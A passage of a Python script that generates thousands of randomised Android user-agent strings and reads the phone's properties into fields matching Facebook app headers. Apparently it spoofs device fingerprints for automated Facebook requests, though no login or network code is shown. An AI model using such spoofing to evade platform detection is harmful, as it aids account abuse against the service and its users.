SAMSUNG SGH-N095T Build/JSS15J) AppleWebKit/602.24 (KHTML, like Gecko)  Chrome/49.0.1355.313 Mobile Safari/601.9','Mozilla/5.0 (Windows NT 10.4; x64) AppleWebKit/535.49 (KHTML, like Gecko) Chrome/53.0.1734.186 Safari/535','Mozilla/5.0 (Windows; Windows NT 10.3;; en-US) AppleWebKit/600.23 (KHTML, like Gecko) Chrome/53.0.1535.342 Safari/602.2 Edge/11.71087','Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.2; WOW64 Trident/7.0)','Mozilla/5.0 (Windows NT 10.1; WOW64) AppleWebKit/536.13 (KHTML, like Gecko) Chrome/50.0.1057.258 Safari/601.8 Edge/12.67975','Mozilla/5.0 (Linux; Android 6.0.1; HTC One0P6B Build/MRA58K) AppleWebKit/534.28 (KHTML, like Gecko)  Chrome/51.0.1768.209 Mobile Safari/534.5','Mozilla/5.0 (iPad; CPU iPad OS 11_5_7 like Mac OS X) AppleWebKit/603.26 (KHTML, like Gecko)  Chrome/50.0.3368.322 Mobile Safari/602.9','Mozilla/5.0 (Windows NT 10.5; Win64; x64) AppleWebKit/602.47 (KHTML, like Gecko) Chrome/50.0.1909.350 Safari/533','Mozilla/5.0 (Linux; Android 4.4; MOTOROLA RAZR Build/KVT49L) AppleWebKit/537.32 (KHTML, like Gecko)  Chrome/53.0.1164.135 Mobile Safari/535.7','Mozilla/5.0 (iPhone; CPU iPhone OS 10_7_9; like Mac OS X) AppleWebKit/601.39 (KHTML, like Gecko)  Chrome/50.0.3371.352 Mobile Safari/603.6','Mozilla/5.0 (Linux x86_64) AppleWebKit/534.45 (KHTML, like Gecko) Chrome/47.0.3748.157 Safari/535','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Win64; x64 Trident/5.0)','Mozilla/5.0 (Linux i544 ) AppleWebKit/536.48 (KHTML, like Gecko) Chrome/49.0.2065.201 Safari/603','Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64; en-US) AppleWebKit/536.34 (KHTML, like Gecko) Chrome/47.0.1715.237 Safari/601.2 Edge/13.38941','Mozilla/5.0 (Linux i566 x86_64; en-US) Gecko/20130401 Firefox/66.1','Mozilla/5.0 (iPhone; CPU iPhone OS 10_7_7; like Mac OS X) AppleWebKit/533.26 (KHTML, like Gecko)  Chrome/55.0.1341.101 Mobile Safari/603.7','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_2_6) Gecko/20100101 Firefox/46.0','Mozilla/5.0 (iPad; CPU iPad OS 10_5_8 like Mac OS X) AppleWebKit/602.4 (KHTML, like Gecko)  Chrome/55.0.3877.281 Mobile Safari/533.8','Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_9; like Mac OS X) AppleWebKit/535.31 (KHTML, like Gecko)  Chrome/52.0.2564.395 Mobile Safari/533.7','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3) Gecko/20130401 Firefox/53.2','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_7_1) AppleWebKit/536.45 (KHTML, like Gecko) Chrome/51.0.2736.326 Safari/602','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.3; Win64; x64 Trident/4.0)','Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.2; Win64; x64 Trident/7.0)','Mozilla/5.0 (Windows; U; Windows NT 10.4;; en-US) Gecko/20130401 Firefox/49.7','Mozilla/5.0 (iPad; CPU iPad OS 9_8_9 like Mac OS X) AppleWebKit/603.48 (KHTML, like Gecko)  Chrome/47.0.2956.394 Mobile Safari/603.9','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_0_4; en-US) Gecko/20100101 Firefox/47.9','Mozilla/5.0 (Linux; U; Android 5.0; SM-P805 Build/LRX22G) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/50.0.2586.386 Mobile Safari/601.9','Mozilla/5.0 (Windows NT 10.5; x64) AppleWebKit/537.39 (KHTML, like Gecko) Chrome/55.0.2733.383 Safari/600.9 Edge/17.70014','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.44 (KHTML, like Gecko) Chrome/49.0.1395.287 Safari/601','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.3;; en-US Trident/4.0)','Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.0; Win64; x64; en-US Trident/4.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9; en-US) AppleWebKit/534.34 (KHTML, like Gecko) Chrome/52.0.1263.238 Safari/536','Mozilla/5.0 (Windows NT 6.3;) AppleWebKit/602.5 (KHTML, like Gecko) Chrome/47.0.1199.348 Safari/536','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1; en-US) AppleWebKit/536.22 (KHTML, like Gecko) Chrome/47.0.2158.240 Safari/535','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.36 (KHTML, like Gecko) Chrome/47.0.3825.124 Safari/601','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2_3; en-US) AppleWebKit/601.17 (KHTML, like Gecko) Chrome/53.0.3878.389 Safari/601','Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_6; like Mac OS X) AppleWebKit/601.31 (KHTML, like Gecko)  Chrome/55.0.1515.373 Mobile Safari/601.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_1_7) AppleWebKit/537.6 (KHTML, like Gecko) Chrome/54.0.3501.261 Safari/600','Mozilla/5.0 (Linux; U; Linux x86_64) AppleWebKit/603.11 (KHTML, like Gecko) Chrome/47.0.2918.325 Safari/603','Mozilla/5.0 (Windows; Windows NT 10.0; Win64; x64; en-US) AppleWebKit/603.27 (KHTML, like Gecko) Chrome/53.0.1606.250 Safari/601','Mozilla/5.0 (Android; Android 4.4; LG-D952 Build/KOT49I) AppleWebKit/533.16 (KHTML, like Gecko)  Chrome/52.0.3575.298 Mobile Safari/602.0','Mozilla/5.0 (Windows; U; Windows NT 10.1;; en-US) AppleWebKit/601.21 (KHTML, like Gecko) Chrome/50.0.2114.155 Safari/603.9 Edge/11.22150','Mozilla/5.0 (Windows NT 10.3;; en-US) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/55.0.3408.287 Safari/534','Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG GT-I9700 Build/KTU84P) AppleWebKit/601.12 (KHTML, like Gecko)  Chrome/47.0.2857.315 Mobile Safari/601.1','Mozilla/5.0 (Windows; U; Windows NT 10.1;) AppleWebKit/600.7 (KHTML, like Gecko) Chrome/49.0.3539.122 Safari/536.1 Edge/16.37756','Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_2; like Mac OS X) AppleWebKit/600.21 (KHTML, like Gecko)  Chrome/53.0.2780.181 Mobile Safari/536.6','Mozilla/5.0 (Windows; U; Windows NT 6.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/53.0.2824.354 Safari/600','Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_1; like Mac OS X) AppleWebKit/602.7 (KHTML, like Gecko)  Chrome/53.0.3064.362 Mobile Safari/534.5','Mozilla/5.0 (Windows; U; Windows NT 10.4; x64) Gecko/20100101 Firefox/63.5','Mozilla/5.0 (Windows; U; Windows NT 6.0; WOW64) Gecko/20100101 Firefox/59.8','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_0_3) AppleWebKit/535.37 (KHTML, like Gecko) Chrome/49.0.1992.126 Safari/600','Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.2; x64 Trident/5.0)','Mozilla/5.0 (Linux; U; Android 5.1.1; SM-G9350FD Build/LMY47X) AppleWebKit/602.35 (KHTML, like Gecko)  Chrome/53.0.2739.284 Mobile Safari/537.8','Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64; en-US) Gecko/20130401 Firefox/66.8','Mozilla/5.0 (Linux; Android 5.1; MOTOROLA MOTO XT1562 Build/LPC23) AppleWebKit/601.50 (KHTML, like Gecko)  Chrome/49.0.1321.133 Mobile Safari/534.8','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_5_1; en-US) Gecko/20100101 Firefox/63.2','Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.2; WOW64; en-US Trident/5.0)','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_7_3) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/50.0.2068.228 Safari/602','Mozilla/5.0 (Android; Android 6.0; HTC OneS dual sim Build/MRA58K) AppleWebKit/601.39 (KHTML, like Gecko)  Chrome/53.0.2557.277 Mobile Safari/537.5','Mozilla/5.0 (Windows; U; Windows NT 10.3;; en-US) AppleWebKit/600.32 (KHTML, like Gecko) Chrome/50.0.2376.365 Safari/600.2 Edge/12.88974','Mozilla/5.0 (Windows; Windows NT 6.2; x64; en-US) Gecko/20100101 Firefox/54.1','Mozilla/5.0 (Linux; U; Linux i552 x86_64; en-US) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/47.0.2048.231 Safari/537','Mozilla/5.0 (iPhone; CPU iPhone OS 10_6_6; like Mac OS X) AppleWebKit/533.16 (KHTML, like Gecko)  Chrome/51.0.3883.387 Mobile Safari/534.9','Mozilla/5.0 (Linux; U; Linux i551 x86_64) Gecko/20100101 Firefox/65.9','Mozilla/5.0 (Linux; Android 5.0.1; SM-A800 Build/LRX22G) AppleWebKit/600.34 (KHTML, like Gecko)  Chrome/55.0.3239.277 Mobile Safari/603.1','Mozilla/5.0 (iPhone; CPU iPhone OS 11_8_0; like Mac OS X) AppleWebKit/601.38 (KHTML, like Gecko)  Chrome/54.0.2949.214 Mobile Safari/600.0','Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_6; like Mac OS X) AppleWebKit/600.32 (KHTML, like Gecko)  Chrome/50.0.1409.295 Mobile Safari/602.6','Mozilla/5.0 (Windows NT 10.5; x64; en-US) AppleWebKit/536.28 (KHTML, like Gecko) Chrome/49.0.1879.374 Safari/535.8 Edge/17.95788','Mozilla/5.0 (U; Linux i586 x86_64; en-US) Gecko/20100101 Firefox/63.1','Mozilla/5.0 (U; Linux i582 x86_64) Gecko/20100101 Firefox/57.1','Mozilla/5.0 (iPhone; CPU iPhone OS 8_9_4; like Mac OS X) AppleWebKit/533.36 (KHTML, like Gecko)  Chrome/48.0.1296.303 Mobile Safari/536.5','Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/49.0.1811.206 Safari/603.1 Edge/13.74954','Mozilla/5.0 (U; Linux i646 ; en-US) AppleWebKit/601.36 (KHTML, like Gecko) Chrome/47.0.1940.206 Safari/603','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_9_6; en-US) Gecko/20100101 Firefox/58.4','Mozilla/5.0 (iPhone; CPU iPhone OS 8_9_9; like Mac OS X) AppleWebKit/536.43 (KHTML, like Gecko)  Chrome/47.0.2607.312 Mobile Safari/600.8','Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.2;; en-US Trident/4.0)','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/69.0','Mozilla/5.0 (Linux; Android 4.4.4; SM-E500L Build/KTU84P) AppleWebKit/536.12 (KHTML, like Gecko)  Chrome/51.0.1257.209 Mobile Safari/603.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_7) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/51.0.3232.393 Safari/600','Mozilla/5.0 (iPad; CPU iPad OS 9_2_3 like Mac OS X) AppleWebKit/602.4 (KHTML, like Gecko)  Chrome/54.0.2202.100 Mobile Safari/602.0','Mozilla/5.0 (iPod; CPU iPod OS 11_0_8; like Mac OS X) AppleWebKit/600.41 (KHTML, like Gecko)  Chrome/47.0.1931.130 Mobile Safari/602.9','Mozilla/5.0 (U; Linux x86_64; en-US) Gecko/20130401 Firefox/61.6','Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1; like Mac OS X) AppleWebKit/600.14 (KHTML, like Gecko)  Chrome/53.0.2524.278 Mobile Safari/600.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_3_0; en-US) AppleWebKit/601.6 (KHTML, like Gecko) Chrome/53.0.1139.281 Safari/535','Mozilla/5.0 (U; Linux x86_64) AppleWebKit/603.7 (KHTML, like Gecko) Chrome/49.0.1022.212 Safari/600','Mozilla/5.0 (Windows NT 10.3; WOW64; en-US) AppleWebKit/602.47 (KHTML, like Gecko) Chrome/49.0.1342.335 Safari/535.7 Edge/17.39745','Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64; en-US) AppleWebKit/533.18 (KHTML, like Gecko) Chrome/50.0.2498.177 Safari/602.1 Edge/18.86628','Mozilla/5.0 (Linux x86_64; en-US) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.2; WOW64; en-US Trident/5.0)','Mozilla/5.0 (Linux; U; Linux x86_64; en-US) Gecko/20130401 Firefox/70.0','Mozilla/5.0 (Windows; U; Windows NT 6.1;; en-US) Gecko/20100101 Firefox/66.8','Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_5; like Mac OS X) AppleWebKit/602.31 (KHTML, like Gecko)  Chrome/49.0.2348.130 Mobile Safari/602.1','Mozilla/5.0 (Windows NT 10.1; WOW64; en-US) AppleWebKit/603.4 (KHTML, like Gecko) Chrome/49.0.1620.309 Safari/536.0 Edge/16.96735','Mozilla/5.0 (Linux; Linux x86_64) AppleWebKit/602.11 (KHTML, like Gecko) Chrome/49.0.3370.154 Safari/603','Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_8; like Mac OS X) AppleWebKit/533.42 (KHTML, like Gecko)  Chrome/50.0.1740.370 Mobile Safari/601.6','Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/534.29 (KHTML, like Gecko) Chrome/54.0.3442.292 Safari/535.3 Edge/15.49401','Mozilla/5.0 (Linux; Linux x86_64) Gecko/20100101 Firefox/55.6','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_4_6) Gecko/20100101 Firefox/47.0',''])
ugen = []
device_models = [
    'T-Mobile myTouch 3G Slide', 'Samsung Galaxy S10', 'Google Pixel 5', 'OnePlus 9', 'Sony Xperia 1 III', 'Xiaomi Mi 11', 'LG V60 ThinQ', 'Motorola Edge', 'Huawei P40 Pro', 'Oppo Find X3 Pro', 'Vivo X60 Pro', 'Nokia 9 PureView', 'Asus ROG Phone 5', 'Lenovo Legion Duel', 'Realme GT', 'BlackBerry Key2', 'HTC U12+', 'ZTE Axon 30 Ultra', 'Xiaomi Redmi Note 10 Pro', 'Sony Xperia 5 III', 'Samsung Galaxy A52', 'Google Pixel 4a', 'OnePlus Nord CE 5G', 'Motorola Moto G Power', 'Huawei Mate 30 Pro', 'Oppo Reno6 Pro+', 'Vivo V21', 'Nokia 7.2', 'Asus ZenFone 8', 'LG Stylo 6', 'Realme 8 5G', 'Acer Iconia Tab A100', 'Acer Iconia Tab A101', 'Acer Iconia Tab A110', 'Acer Iconia Tab A200', 'Acer Iconia Tab A210',
    'Acer Iconia Tab A211', 'Acer Iconia Tab A3-A10', 'Acer Iconia Tab A3-A11', 'Acer Iconia Tab A3-A20', 'Acer Iconia Tab A3-A30',
    'Acer Iconia Tab A500', 'Acer Iconia Tab A501', 'Acer Iconia Tab A510', 'Acer Iconia Tab A511', 'Acer Iconia Tab A700',
    'Acer Iconia Tab A701', 'Acer Iconia Tab B1-710', 'Acer Iconia Tab B1-711', 'Acer Iconia Tab B1-A71', 'Acer Iconia Tab B1-720',
    'Acer Iconia Tab B1-721', 'Acer Iconia Tab B1-A71', 'Acer Iconia Tab B1-A71', 'Acer Iconia Tab B1-730', 'Acer Iconia Tab B1-730HD',
    'Acer Iconia Tab B1-731', 'Acer Iconia Tab B1-750', 'Acer Iconia Tab B1-770', 'Acer Iconia Tab B1-780', 'Acer Iconia Tab B3-A10',
    'Acer Iconia Tab B3-A20', 'Acer Iconia Tab B3-A30', 'Acer Iconia Tab B3-A31', 'Acer Iconia Tab B3-A32', 'Acer Iconia Tab B3-A40',
    'Acer Iconia Tab B3-A42', 'Acer Iconia Tab B3-A50', 'Acer Iconia Tab B3-A51', 'Acer Iconia Tab B3-A60', 'Acer Iconia Tab B3-A70',
    'Acer Iconia Tab B3-A71', 'Acer Iconia Tab B3-A72', 'Acer Iconia Tab B3-A73', 'Acer Iconia Tab B3-A74', 'Acer Iconia Tab B3-A75',
    'Acer Iconia Tab B3-A76', 'Acer Iconia Tab B3-A80', 'Acer Iconia Tab B3-A81', 'Acer Iconia Tab B3-A82', 'Acer Iconia Tab B3-A90',
    'Acer Iconia Tab B3-A91', 'Acer Iconia Tab B3-A92', 'Acer Iconia Tab B3-A93', 'Acer Iconia Tab B3-A94', 'Acer Iconia Tab B3-A95', 'Galaxy S10', 'Pixel 5', 'G7 ThinQ', 'Moto G Power', 'Xperia 1 II', 'Mi 11', 'OnePlus 9', 'U11', 'Nokia 8', 'P40 Pro',
    'ZenFone 8', 'Legion Phone Duel 2', 'Find X3 Pro', 'Y20s G', 'Narzo 30 Pro', 'Predator Triton 500', 'Axon 30 Ultra',
    'Idol 5', 'MX9 Pro', 'Hot 10', 'Redmi Note 10', 'OnePlus Nord N200', 'Pixel 6', 'Xperia 5 III', 'Moto G30', 'Mi 11 Lite',
    'Nokia 6.4', 'Vivo V21', 'Realme 8 Pro', 'Galaxy A52s 5G', 'ZenFone 9', 'ROG Phone 5', 'Key3', 'Marathon M12', 'V40 Pro',
    'iQOO 9', 'Legion 3 Pro', 'Infinix Note 12', 'Gionee M15', 'Poco X5', 'Sharp Aquos R6', 'Nokia C20 Plus', 'Wiko View 5',
    'Panasonic Eluga X1 Pro', 'Symphony i120', 'Redmi Note 11', 'OnePlus 10', 'Mi 12', 'Galaxy S22', 'Pixel 7', 'Xperia 6',
    'Realme GT 3', 'Vivo X80 Pro', 'ZenFone 10', 'ROG Phone 6', 'Infinix Hot 12', 'Poco X6', 'Nokia 7.4', 'iQOO 10', 'Moto Edge 40',
    'Oppo F19s', 'Vivo Y75', 'Micromax In Note 2', 'Lava Z8', 'BlackBerry Q10', 'Tecno Camon 18', 'Gionee M13', 'Samsung Galaxy S21', 'Samsung Galaxy S20', 'Samsung Galaxy S10', 'Samsung Galaxy Note 20',
    'Samsung Galaxy Note 10', 'Samsung Galaxy A52', 'Samsung Galaxy A32', 'Samsung Galaxy A12',
    'Samsung Galaxy M31', 'Samsung Galaxy M11', 'Samsung Galaxy Z Fold 3', 'Samsung Galaxy Z Flip 3',
    'Samsung Galaxy Fold', 'Samsung Galaxy Z Fold 2', 'Samsung Galaxy Z Flip', 'Samsung Galaxy S21 Ultra',
    'Samsung Galaxy S21 Plus', 'Samsung Galaxy S20 Ultra', 'Samsung Galaxy S20 Plus', 'Samsung Galaxy S10 Plus',
    'Samsung Galaxy Note 20 Ultra', 'Samsung Galaxy Note 10 Plus', 'Samsung Galaxy A72', 'Samsung Galaxy A52 5G',
    'Samsung Galaxy A32 5G', 'Samsung Galaxy A21', 'Samsung Galaxy M51', 'Samsung Galaxy M21',
    'Samsung Galaxy Z Fold 3 5G', 'Samsung Galaxy Z Flip 3 5G', 'Samsung Galaxy S21 5G',
    'Samsung Galaxy S21 Plus 5G', 'Samsung Galaxy S20 FE', 'Samsung Galaxy Note 20 5G', 'Samsung Galaxy Note 10 Lite',
    'Samsung Galaxy A71', 'Samsung Galaxy A51', 'Samsung Galaxy A31', 'Samsung Galaxy A11',
    'Samsung Galaxy M62', 'Samsung Galaxy M42 5G', 'Samsung Galaxy M12', 'Samsung Galaxy Z Fold 2 5G',
    'Samsung Galaxy Z Flip 5G', 'Samsung Galaxy S21 Ultra 5G', 'Samsung Galaxy S21 Plus 5G',
    'Samsung Galaxy S20 Ultra 5G', 'Samsung Galaxy S20 Plus 5G', 'Samsung Galaxy S10 5G',
    'Samsung Galaxy Note 20 Ultra 5G', 'Samsung Galaxy Note 10 Plus 5G', 'Samsung Galaxy A72 5G',
    'Samsung Galaxy A52 5G', 'Samsung Galaxy A32 5G', 'Samsung Galaxy A21s', 'Samsung Galaxy M62 5G',
    'Samsung Galaxy M42 5G', 'Samsung Galaxy M12 5G', 'Samsung Galaxy Z Fold 3 5G',
    'Samsung Galaxy Z Flip 3 5G', 'Samsung Galaxy S21 5G', 'Samsung Galaxy S21 Plus 5G',
    'Samsung Galaxy S20 FE 5G', 'Samsung Galaxy Note 20 5G', 'Samsung Galaxy Note 10 Lite 5G',
    'Samsung Galaxy A71 5G', 'Samsung Galaxy A51 5G', 'Samsung Galaxy A31 5G', 'Samsung Galaxy A11 5G',
    'Samsung Galaxy M62 5G', 'Samsung Galaxy M42 5G', 'Samsung Galaxy M12 5G', 'Samsung Galaxy Z Fold 2 5G',
    'Samsung Galaxy Z Flip 5G', 'Samsung Galaxy S21 Ultra 5G', 'Samsung Galaxy S21 Plus 5G',
    'Samsung Galaxy S20 Ultra 5G', 'Samsung Galaxy S20 Plus 5G', 'Samsung Galaxy S10 5G',
    'Samsung Galaxy Note 20 Ultra 5G', 'Samsung Galaxy Note 10 Plus 5G', 'Samsung Galaxy A72 5G',
    'Samsung Galaxy A52 5G', 'Samsung Galaxy A32 5G', 'Samsung Galaxy A21s 5G', 'Samsung Galaxy M62 5G',
    'Samsung Galaxy M42 5G', 'Samsung Galaxy M12 5G', 'Samsung Galaxy Z Fold 3 5G',
    'Samsung Galaxy Z Flip 3 5G', 'Samsung Galaxy S21 5G', 'Samsung Galaxy S21 Plus 5G',
    'Samsung Galaxy S20 FE 5G', 'Samsung Galaxy Note 20 5G', 'Samsung Galaxy Note 10 Lite 5G',
    'Samsung Galaxy A71 5G', 'Samsung Galaxy A51 5G', 'Samsung Galaxy A31 5G', 'Samsung Galaxy A11 5G', 'Infinix Zero 8', 'Infinix Note 10 Pro', 'Infinix Hot 10', 'Infinix S5', 'Infinix Smart 5', 'Infinix Hot 9', 'Infinix Note 8', 'Infinix S4', 'Infinix Smart 4', 'Infinix Hot 8',
    'Infinix Note 7', 'Infinix S3', 'Infinix Smart 3', 'Infinix Hot 7', 'Infinix Note 6',
    'Infinix S2', 'Infinix Smart 2', 'Infinix Hot 6', 'Infinix Note 5', 'Infinix S1',
    'Infinix Smart', 'Infinix Hot 5', 'Infinix Note 4', 'Infinix S5 Pro', 'Infinix Smart 4 Plus',
    'Infinix Hot 4', 'Infinix Note 3', 'Infinix S5 Lite', 'Infinix Smart 3 Plus', 'Infinix Hot 3',
    'Infinix Note 2', 'Infinix S5 Pro (S6)', 'Infinix Smart 2 HD', 'Infinix Hot S', 'Infinix Note',
    'Infinix S5 Lite (S6 Lite)', 'Infinix Smart 2 Pro', 'Infinix Hot S3', 'Infinix Note Pro', 'Infinix S4 Pro',
    'Infinix Smart 2 32GB', 'Infinix Hot S3X', 'Infinix Note 3 Pro', 'Infinix S3X', 'Infinix Smart 2 64GB',
    'Infinix Hot S3 Pro', 'Infinix Note 4 Pro', 'Infinix S2 Pro', 'Infinix Smart 2 16GB', 'Infinix Hot S2',
    'Infinix Hot 3 Pro', 'Infinix Note 4 (X572)', 'Infinix S2 32GB', 'Infinix Smart 2 (X5515F)', 'Infinix Hot S2 Pro',
    'Infinix Hot 3 LTE', 'Infinix Note 4 (X573)', 'Infinix S2 Pro 64GB', 'Infinix Smart 3 (X5516B)', 'Infinix Hot 4 (X557)',
    'Infinix Note 4 (X573B)', 'Infinix S3 (X573S)', 'Infinix Smart 3 Plus (X627)', 'Infinix Hot 4 (X557B1)', 'Infinix Note 5 (X604)',
    'Infinix S3 (X573B)', 'Infinix Smart 4 (X653C)', 'Infinix Hot 4 (X557F1)', 'Infinix Note 5 (X604B)', 'Infinix S3 (X573C)',
    'Infinix Smart 4 (X653)', 'Infinix Hot 4 (X557H1)', 'Infinix Note 5 (X604C)', 'Infinix S4 (X626)', 'Infinix Smart 4 (X653B1)',
    'Infinix Hot 4 (X557L)', 'Infinix Note 5 (X604F)', 'Infinix S4 (X626B)', 'Infinix Smart 4 Plus (X680)', 'Infinix Hot 4 (X557S)',
    'Infinix Note 5 (X604H)', 'Infinix S4 (X626B1)', 'Infinix Smart 5 (X657)', 'Infinix Hot 4 (X557S1)', 'Infinix Note 5 (X604J)',
    'Infinix S4 (X626B2)', 'Infinix Smart 5 (X657B)', 'Infinix Hot 4 (X557S2)', 'Infinix Note 5 (X604L)', 'Infinix S4 Pro (X626D)',
    'Infinix Smart 5 (X657C)', 'Infinix Hot 4 (X557S3)', 'Infinix Note 5 (X604S)', 'Infinix S4 Pro (X626D1)', 'Infinix Smart 5 Plus (X680B)',
    'Infinix Hot 4 (X557S4)', 'Infinix Note 5 (X604T)', 'Infinix S4 Pro (X626D2)', 'Infinix Smart HD 2021', 'Infinix Hot 4 (X557S4R)',
    'Infinix Note 5 (X604V)', 'Infinix S5 (X652)', 'Infinix Smart HD 2021 (X612C)', 'Infinix Hot 4 (X557S4U)', 'Infinix Note 5 (X604W)',
    'Infinix S5 Lite (X652A)', 'Infinix Smart HD 2021 (X612D)', 'Infinix Hot 4 (X557S4X)', 'Infinix Note 5 (X604X)', 'Infinix S5 Pro (X660B)',
    'Infinix Smart HD 2021 (X612F)', 'Infinix Hot 4 (X557S4Y)', 'Infinix Note 5 Lite (X605)', 'Infinix S5 Pro (X660C)', 'Infinix Smart HD 2021 (X612J)',
    'Infinix Hot 4 (X557S5)', 'Infinix Note 5 Stylus (X605)', 'Infinix S5 Pro (X660D)', 'Infinix Smart HD 2021 (X612L)', 'Infinix Hot 4 (X557S6)',
    'Infinix Note 5 Stylus (X605B)', 'Infinix S5 Pro (X660F)', 'Infinix Smart HD 2021 (X612LX)', 'Infinix Hot 4 (X557S7)', 'Infinix Note 6 (X610B)',
    'Infinix S5 Pro (X660X)', 'Infinix Smart HD 2021 (X612X)', 'Infinix Hot 4 (X557S8)', 'Infinix Note 7 Lite (X660)', 'Infinix Smart HD 2021 (X612B)',
    'Infinix Hot 4 (X557S9)', 'Infinix Note 7 Lite (X660B)', 'Infinix Smart HD 2021 (X612CQ)', 'Infinix Hot 4 (X557S9T)', 'Infinix Note 7 Lite (X660C)',
    'Infinix Smart HD 2021 (X612DQ)', 'Infinix Hot 4 (X557S9Y)', 'Infinix Note 7 Lite (X660D)', 'Infinix Smart HD 2021 (X612E)', 'Infinix Hot 4 (X557S9X)',
    'Infinix Note 7 Lite (X660F)', 'Infinix Smart HD 2021 (X612FQ)', 'Infinix Hot 4 (X557X)', 'Infinix Note 7 Lite (X660G)', 'Infinix Smart HD 2021 (X612H)',
    'Infinix Hot 4 (X557X1)', 'Infinix Note 7 Lite (X660H)', 'Infinix Smart HD 2021 (X612LQ)', 'Infinix Hot 4 (X557X2)', 'Infinix Note 7 Lite (X660J)',
    'Infinix Smart HD 2021 (X612N)', 'Infinix Hot 4 (X557X3)', 'Infinix Note 7 Lite (X660K)', 'Infinix Smart HD 2021 (X612XQ)', 'Infinix Hot 4 (X557X4)',
    'Infinix Note 7 Lite (X660L)', 'Infinix Smart HD 2021 (X612Y)', 'Infinix Hot 4 (X557X5)', 'Infinix Note 7 Lite (X660M)', 'Infinix Smart HD 2021 (X612Z)', ]

user_agents = []

for _ in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12', '13', '14'])
    c = 'en-us; 10; '
    device_model = random.choice(device_models)
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    full_agent = f'{aa} {b}; {c}{device_model}) {g}{h}.{i}.{j}.{k} {l}'
    user_agents.append(full_agent)

sim_id = ''
android_version = subprocess.check_output(
    'getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
model = subprocess.check_output(
    'getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
build = subprocess.check_output(
    'getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
        'utf-8').split(',')[0].replace('\n', '')
except:
    fbcr = 'Zong'
fbmf = subprocess.check_output(
    'getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output(
    'getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode(
    'utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace(
    '\n', '')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '')
try:
    fbcr = subprocess.check_output(
        'getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
    total = 0
    for i in fbcr:
        total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
            'utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
    elif select == '2':
        try:
            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
                'utf-8').split(',')[1].replace('\n', '')
            sim_id += fbcr
        except Exception as e:
            fbcr = "Zong"
            sim_id += fbcr
    else:
        fbcr = 'Zong'
        sim_id += fbcr
except:
    fbcr = "Zong"
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
